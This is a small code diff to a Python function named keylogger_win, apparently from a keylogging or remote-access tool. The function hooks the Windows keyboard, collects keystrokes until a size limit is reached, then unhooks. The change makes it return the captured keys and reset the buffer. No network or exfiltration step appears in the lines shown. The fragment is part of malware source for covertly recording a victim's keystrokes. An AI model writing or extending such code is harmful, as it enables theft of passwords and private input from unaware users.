@@ -26,5 +26,7 @@ def keylogger_win(size):
     while len(keysPressed) < int(size):
         pythoncom.PumpWaitingMessages()
     else:
+        keys = keysPressed
+        keysPressed = ">"
         hm.UnhookKeyboard()
-        return keysPressed
+        return keys
